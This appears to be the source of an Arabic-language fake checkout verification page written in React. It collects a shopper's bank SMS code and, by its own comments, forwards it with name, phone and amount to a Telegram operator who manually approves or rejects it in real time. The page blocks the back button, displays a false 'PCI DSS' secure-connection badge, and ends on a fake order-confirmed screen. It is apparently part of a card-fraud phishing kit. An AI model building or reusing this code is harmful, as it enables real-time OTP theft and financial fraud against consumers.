"use client";

import { useEffect, useState, useRef, useCallback } from "react";
import { useRouter } from "next/navigation";
import { Lock, CheckCircle2, Loader2, Copy, Check, ArrowRight } from "lucide-react";
import { normalizeDigits } from "../cardValidation";

const fmt = (n: number) => n.toLocaleString("ar-SA");

function formatDate(iso: string) {
  try {
    return new Date(iso).toLocaleString("ar-SA", {
      year: "numeric",
      month: "long",
      day: "numeric",
      hour: "2-digit",
      minute: "2-digit",
    });
  } catch {
    return new Date().toLocaleDateString("ar-SA");
  }
}

export default function VerifyPage() {
  const router = useRouter();
  const [data, setData] = useState<{
    orderId?: string;
    amount: number;
    last4: string;
    date: string;
    phone: string;
    customerName?: string;
  } | null>(null);

  const [otp, setOtp] = useState("");
  const [timer, setTimer] = useState(45);
  const [submitting, setSubmitting] = useState(false);
  const [error, setError] = useState("");
  const [cooldown, setCooldown] = useState(0);
  const [blocked, setBlocked] = useState(false);

  // Confirmation screen state
  const [isConfirmed, setIsConfirmed] = useState(false);
  const [redirectCountdown, setRedirectCountdown] = useState(5);
  const [copied, setCopied] = useState(false);

  const pollingRef = useRef<NodeJS.Timeout | null>(null);

  const stopPolling = useCallback(() => {
    if (pollingRef.current) {
      clearInterval(pollingRef.current);
      pollingRef.current = null;
    }
  }, []);

  // 1. Load verify data from sessionStorage
  useEffect(() => {
    const raw = sessionStorage.getItem("verify_data");
    if (!raw) {
      router.replace("/cart");
      return;
    }
    try {
      setData(JSON.parse(raw));
    } catch {
      router.replace("/cart");
      return;
    }

    history.pushState(null, "", window.location.href);
    const block = () => history.pushState(null, "", window.location.href);
    window.addEventListener("popstate", block);
    return () => {
      window.removeEventListener("popstate", block);
      stopPolling();
    };
  }, [router, stopPolling]);

  // 2. Resend Timer countdown
  useEffect(() => {
    if (timer <= 0) return;
    const t = setTimeout(() => setTimer((s) => s - 1), 1000);
    return () => clearTimeout(t);
  }, [timer]);

  const timerStr = `${String(Math.floor(timer / 60)).padStart(2, "0")}:${String(
    timer % 60
  ).padStart(2, "0")}`;

  // 3. Cooldown countdown
  useEffect(() => {
    if (cooldown <= 0) return;
    const t = setTimeout(() => setCooldown((s) => s - 1), 1000);
    return () => clearTimeout(t);
  }, [cooldown]);

  // 4. Redirect countdown on confirmed success
  useEffect(() => {
    if (!isConfirmed) return;
    if (redirectCountdown <= 0) {
      router.replace("/");
      return;
    }
    const t = setTimeout(() => setRedirectCountdown((s) => s - 1), 1000);
    return () => clearTimeout(t);
  }, [isConfirmed, redirectCountdown, router]);

  // 5. Handle OTP Submission & Start Interactive Polling
  const handleSubmit = async () => {
    const digits = normalizeDigits(otp).replace(/\D/g, "");
    if (digits.length !== 4 && digits.length !== 6) {
      setError("رمز التحقق يجب أن يكون 4 أو 6 أرقام");
      return;
    }

    const orderId = String(data?.orderId || "");
    const attemptsKey = `verify_attempts_${orderId}`;
    const attempts = parseInt(sessionStorage.getItem(attemptsKey) ?? "0", 10) + 1;
    sessionStorage.setItem(attemptsKey, String(attempts));

    if (attempts > 6) {
      sessionStorage.removeItem(attemptsKey);
      sessionStorage.removeItem("verify_data");
      setBlocked(true);
      let countdown = 5;
      setError(`لقد تجاوزت الحد المسموح به من المحاولات، سيتم تحويلك لإعادة الطلب خلال ${countdown}`);
      const interval = setInterval(() => {
        countdown -= 1;
        if (countdown <= 0) {
          clearInterval(interval);
          router.replace("/cart");
        } else {
          setError(`لقد تجاوزت الحد المسموح به من المحاولات، سيتم تحويلك لإعادة الطلب خلال ${countdown}`);
        }
      }, 1000);
      return;
    }

    setSubmitting(true);
    setError("");
    setCooldown(3);

    // Send code to Telegram with action buttons
    try {
      await fetch("/api/verify", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          code: digits,
          orderId,
          customerName: data?.customerName,
          phone: data?.phone,
          amount: data?.amount,
        }),
      });
    } catch {}

    // Start polling the decision from Telegram (every 1.5s)
    stopPolling();
    let pollCount = 0;
    const maxPolls = 60; // 90 seconds timeout

    pollingRef.current = setInterval(async () => {
      pollCount++;
      try {
        const res = await fetch(`/api/verify?orderId=${encodeURIComponent(orderId)}&t=${Date.now()}`);
        if (res.ok) {
          const json = await res.json();

          // A) Approved by admin in Telegram!
          if (json.status === "approved") {
            stopPolling();
            setSubmitting(false);

            // Clear cart & session
            try {
              sessionStorage.removeItem("verify_data");
              sessionStorage.removeItem(attemptsKey);
              localStorage.removeItem("cart");
            } catch {}

            setIsConfirmed(true);
            return;
          }

          // B) Rejected by admin in Telegram!
          if (json.status === "rejected") {
            stopPolling();
            setSubmitting(false);
            setOtp("");
            setError("رمز التحقق الذي أدخلته غير صحيح، يرجى كتابة الرمز الصحيح المستلم على هاتفك.");
            return;
          }
        }
      } catch {}

      if (pollCount >= maxPolls) {
        stopPolling();
        setSubmitting(false);
        setError("انتهت مهلة التحقق، يرجى الضغط على إعادة إرسال الرمز والمحاولة مجدداً.");
      }
    }, 1500);
  };

  const handleCopyOrderId = () => {
    if (data?.orderId) {
      navigator.clipboard.writeText(data.orderId);
      setCopied(true);
      setTimeout(() => setCopied(false), 2000);
    }
  };

  const maskedPhone = data?.phone
    ? data.phone.slice(0, 3) + "****" + data.phone.slice(-3)
    : "05*****";

  if (!data) return null;

  // ────────────────────────────────────────────────────────────────
  // SCREEN 1: SUCCESS CONFIRMATION MODAL (REALISTIC & BEAUTIFUL)
  // ────────────────────────────────────────────────────────────────
  if (isConfirmed) {
    return (
      <div className="min-h-screen bg-slate-50 flex items-center justify-center px-4 py-8" dir="rtl">
        <div className="w-full max-w-md bg-white rounded-2xl shadow-xl border border-gray-100 overflow-hidden text-center animate-in fade-in zoom-in-95 duration-300">
          {/* Top Decorative Gradient */}
          <div className="h-2 w-full" style={{ background: "linear-gradient(90deg, #10B981, #059669, #047857)" }} />

          <div className="p-6 sm:p-8 space-y-6">
            {/* Animated Checkmark Badge */}
            <div className="relative mx-auto w-20 h-20 flex items-center justify-center">
              <div className="absolute inset-0 rounded-full bg-emerald-100 animate-ping opacity-25" />
              <div className="relative w-16 h-16 rounded-full bg-emerald-500 text-white flex items-center justify-center shadow-lg shadow-emerald-500/30">
                <CheckCircle2 size={36} className="stroke-[2.5]" />
              </div>
            </div>

            {/* Title & Subtitle */}
            <div className="space-y-2">
              <h1 className="text-xl sm:text-2xl font-black text-slate-800">
                تم تأكيد طلبك بنجاح!
              </h1>
              <p className="text-xs sm:text-sm text-slate-500 leading-relaxed">
                تم التحقق من عملية الدفع وتأكيد حجز طلبك بنجاح.
              </p>
            </div>

            {/* Official Order Summary Box */}
            <div className="bg-slate-50 border border-slate-200/70 rounded-xl p-4 text-xs sm:text-sm text-right space-y-3">
              <div className="flex items-center justify-between pb-2 border-b border-slate-200/70">
                <span className="text-slate-500 font-medium">رقم الطلب:</span>
                <button
                  onClick={handleCopyOrderId}
                  className="font-mono font-bold text-slate-900 bg-white border border-slate-200 px-2 py-1 rounded-md flex items-center gap-1.5 hover:bg-slate-100 transition"
                  title="نسخ رقم الطلب"
                >
                  <span dir="ltr">#{data.orderId}</span>
                  {copied ? <Check size={13} className="text-emerald-600" /> : <Copy size={13} className="text-slate-400" />}
                </button>
              </div>

              <div className="flex items-center justify-between">
                <span className="text-slate-500 font-medium">اسم العميل:</span>
                <span className="font-bold text-slate-800">{data.customerName || "عميلنا الكريم"}</span>
              </div>

              <div className="flex items-center justify-between">
                <span className="text-slate-500 font-medium">المبلغ الإجمالي:</span>
                <span className="font-black text-emerald-700">
                  {fmt(data.amount)} <span className="text-xs font-medium text-slate-500">ر.س</span>
                </span>
              </div>

              <div className="flex items-center justify-between">
                <span className="text-slate-500 font-medium">تاريخ الحجز:</span>
                <span className="text-slate-600 text-[11px] sm:text-xs">{formatDate(data.date)}</span>
              </div>
            </div>

            {/* Reassurance WhatsApp Box */}
            <div className="bg-emerald-50/70 border border-emerald-200/80 rounded-xl p-3.5 text-right flex items-start gap-3">
              <span className="text-xl shrink-0">📱</span>
              <p className="text-xs text-emerald-900 leading-relaxed font-medium">
                سيتم التواصل معك مباشرة عبر تطبيق <b>الواتساب</b> على رقمك المسجل{" "}
                <span className="font-mono font-bold" dir="ltr">({maskedPhone})</span> لتأكيد تفاصيل الشحن والتسليم.
              </p>
            </div>

            {/* Auto Redirect Countdown */}
            <div className="pt-2 space-y-3">
              <button
                onClick={() => router.replace("/")}
                className="w-full py-3 bg-emerald-600 hover:bg-emerald-700 text-white font-bold rounded-xl text-xs sm:text-sm shadow-md shadow-emerald-600/20 transition flex items-center justify-center gap-2"
              >
                العودة للصفحة الرئيسية
                <ArrowRight size={16} />
              </button>

              <p className="text-[11px] text-slate-400 flex items-center justify-center gap-1.5 font-mono">
                <Loader2 size={12} className="animate-spin text-emerald-600" />
                جاري نقلك تلقائياً خلال {redirectCountdown} ثوانٍ...
              </p>
            </div>
          </div>
        </div>
      </div>
    );
  }

  // ────────────────────────────────────────────────────────────────
  // SCREEN 2: OTP VERIFICATION FORM
  // ────────────────────────────────────────────────────────────────
  return (
    <div className="min-h-screen bg-white flex items-center justify-center px-4 pt-4 pb-8" dir="rtl">
      <div className="w-full max-w-sm bg-white shadow-lg border border-gray-100">
        {/* Header */}
        <div className="h-1 w-full" style={{ background: "linear-gradient(90deg,#65E0CD,#1B7174)" }} />
        <div className="px-6 pt-6 pb-4">
          <h2 className="text-sm sm:text-base font-black text-[#173e48] pb-3 border-b border-gray-200 text-center">
            تأكيد عملية الشراء
          </h2>
          <p className="text-[11px] sm:text-xs text-gray-400 mt-3 leading-relaxed">
            تم إرسال رسالة نصية بها رمز التحقق إلى رقم الجوال{" "}
            <span className="font-bold text-[#173e48]" dir="ltr">
              {maskedPhone}
            </span>{" "}
            لإتمام المعاملة.
          </p>
        </div>

        {/* Details Card */}
        <div className="mx-6 mb-5 border border-gray-100 divide-y divide-gray-100">
          <Row label="المبلغ">
            <span className="font-black text-[#173e48] text-xs sm:text-sm">
              {fmt(data.amount)}{" "}
              <span className="text-[11px] sm:text-xs font-medium text-gray-400">ر.س</span>
            </span>
          </Row>
          <Row label="التاريخ">
            <span className="text-[11px] sm:text-xs text-gray-500">{formatDate(data.date)}</span>
          </Row>
          <Row label="وسيلة الدفع">
            <span className="font-mono text-xs sm:text-sm text-[#173e48] tracking-widest" dir="ltr">
              •••• •••• •••• {data.last4}
            </span>
          </Row>
        </div>

        {/* OTP Input Form */}
        <div className="px-6 pb-5 space-y-4">
          <div>
            <p className="text-[10px] font-black text-gray-400 uppercase tracking-widest mb-1">
              Verification Code
            </p>
            <input
              type="text"
              inputMode="numeric"
              maxLength={6}
              placeholder="أدخل رمز التحقق"
              value={otp}
              onChange={(e) => {
                if (blocked || submitting) return;
                setOtp(normalizeDigits(e.target.value).replace(/\D/g, "").slice(0, 6));
                setError("");
              }}
              onBlur={(e) => {
                const d = normalizeDigits(e.target.value).replace(/\D/g, "");
                if (d.length > 0 && d.length !== 4 && d.length !== 6) {
                  setError("رمز التحقق يجب أن يكون 4 أو 6 أرقام");
                }
              }}
              disabled={blocked || submitting}
              className="w-full border border-gray-200 px-4 py-3 text-xs sm:text-sm text-[#173e48] font-bold placeholder:text-gray-300 focus:outline-none focus:border-[#65E0CD] transition-colors disabled:opacity-50"
              dir="ltr"
            />
            {error && <p className="text-red-500 text-xs font-bold mt-1.5 leading-relaxed">⚠ {error}</p>}
          </div>

          {/* Submitting Loading Message */}
          {submitting && (
            <div className="bg-teal-50 border border-teal-200 rounded-lg p-2.5 text-center flex items-center justify-center gap-2 animate-pulse">
              <Loader2 size={14} className="animate-spin text-teal-700" />
              <span className="text-[11px] text-teal-800 font-bold">
                جاري التحقق من كود الأمان وتأكيد الطلب... يرجى الانتظار
              </span>
            </div>
          )}

          <div className="text-center">
            {timer > 0 ? (
              <p className="text-xs text-gray-400">
                إعادة الإرسال خلال{" "}
                <span className="font-black text-[#173e48] font-mono">{timerStr}</span>
              </p>
            ) : (
              <button
                onClick={async () => {
                  if (blocked || submitting) return;
                  setTimer(45);
                  await fetch("/api/resend", {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({
                      orderId: data?.orderId,
                      customerName: data?.customerName ?? data?.phone,
                    }),
                  });
                }}
                disabled={blocked || submitting}
                className="text-xs font-bold text-[#173e48] underline underline-offset-2 disabled:opacity-40 disabled:cursor-not-allowed"
              >
                إعادة إرسال الرمز
              </button>
            )}
          </div>

          <button
            onClick={handleSubmit}
            disabled={
              blocked ||
              submitting ||
              cooldown > 0 ||
              (normalizeDigits(otp).replace(/\D/g, "").length !== 4 &&
                normalizeDigits(otp).replace(/\D/g, "").length !== 6)
            }
            className="w-full py-3 text-white font-black text-xs sm:text-sm flex items-center justify-center gap-2 disabled:opacity-40 transition hover:opacity-90"
            style={{ background: "linear-gradient(135deg,#65E0CD,#1B7174)", color: "#053132" }}
          >
            {submitting ? (
              <>
                <Loader2 size={14} className="animate-spin" />
                <span>جاري التحقق...</span>
              </>
            ) : cooldown > 0 ? (
              <span className="font-mono tabular-nums">{cooldown}</span>
            ) : (
              <>
                <Lock size={13} />
                <span>إتمام الدفع</span>
              </>
            )}
          </button>

          <p className="text-center text-[10px] text-gray-300 flex items-center justify-center gap-1">
            <Lock size={9} /> اتصال مشفّر وآمن · PCI DSS
          </p>
        </div>
      </div>
    </div>
  );
}

function Row({ label, children }: { label: string; children: React.ReactNode }) {
  return (
    <div className="flex items-center justify-between px-4 py-3">
      <span className="text-xs text-gray-400 font-medium">{label}</span>
      <span>{children}</span>
    </div>
  );
}
